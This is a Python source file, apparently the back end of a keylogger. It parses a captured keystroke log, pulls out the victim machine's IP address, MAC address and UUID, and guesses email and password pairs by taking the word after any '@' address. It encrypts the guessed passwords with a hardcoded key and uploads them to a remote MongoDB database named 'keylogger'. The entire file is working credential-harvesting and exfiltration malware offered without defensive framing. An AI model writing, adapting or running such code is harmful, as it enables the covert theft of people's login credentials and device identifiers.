import os
import re
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from pymongo import MongoClient

file_path = os.path.join('.', 'output.txt')

possible_emails = []
possible_passwords = []

# Connect to the MongoDB database
client = MongoClient('mongodb+srv://keylogger.j4bwtmx.mongodb.net/keylogger?authMechanism=MONGODB-X509&authSource=%24external&tls=true&tlsCertificateKeyFile=admin.pem')
db = client['keylogger']
passwords_collection = db['keylogger']

# Define the AES encryption key and initialization vector (IV)
encryption_key = b'Sixteen byte key'
iv = get_random_bytes(16)

'''
Super basic email and password finder
'''

def encrypt_password(password):
    # Pad the password so that it is a multiple of 16 bytes
    password = password.ljust(16 * (len(password) // 16 + 1), b'\0')
    # Create the AES cipher object
    cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
    # Encrypt the password using AES in CBC mode
    encrypted_password = cipher.encrypt(password)
    # Return the encrypted password and the initialization vector
    return encrypted_password, iv

def get_email_password():
    ip = None
    mac = None
    machine_id = None
    with open(file_path, 'r+') as file:
        line_idx = 0
         # reading each line   
        for line in file:
            if line_idx < 3:
                re_ip = re.search('(?<=IP=).+', line)
                re_mac = re.search('(?<=MAC=).+', line)
                re_uuid = re.search('(?<=UUID=).+', line)
                ip = re_ip.group() if ip is None and re_ip is not None else ip
                mac = re_mac.group() if mac is None and re_mac is not None else mac
                machine_id = re_uuid.group() if machine_id is None and re_uuid is not None else machine_id
                line_idx += 1
                continue
            line = line.split()   
            for widx, word in enumerate(line):         
                if '@' in word:
                    possible_emails.append(word)

                    # if a word has an @ in it, assume the next word is the password
                    try:
                        possible_passwords.append(line[widx+1])

                    # if the word is the end of the line, assume the first word of the next line is the password
                    except:
                        try:
                            possible_passwords.append(next(file).split()[0])
                        except:
                            possible_passwords.append('end of file')
            line_idx += 1
    
    # Encrypt the passwords and store them in the MongoDB database
    for i, email in enumerate(possible_emails):
        password = possible_passwords[i]
        # Encrypt the password using AES
        encrypted_password, iv = encrypt_password(password.encode('utf-8'))
        # Store the encrypted password and associated email in the database
        passwords_collection.insert_one({
            'machineId': machine_id,
            'ip': ip,
            'mac': mac,
            'email': email,
            'encrypted_password': encrypted_password,
            'iv': iv
        })

if __name__  == '__main__':
    get_email_password()
